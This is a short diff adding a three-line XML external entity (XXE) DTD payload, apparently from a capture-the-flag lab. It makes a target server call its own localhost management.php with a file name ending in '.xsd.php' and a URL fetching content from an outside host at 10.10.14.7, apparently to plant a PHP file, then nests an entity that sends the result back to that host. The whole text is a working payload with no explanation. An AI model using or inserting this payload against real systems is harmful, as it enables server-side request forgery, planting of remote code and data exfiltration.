@@ -1,0 +1,3 @@
+<!ENTITY % test SYSTEM "http://127.0.0.1/management.php?filename=test.xsd.php&url=http%3A//10.10.14.7/what.php">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.7/?%test;'>">
+%all;
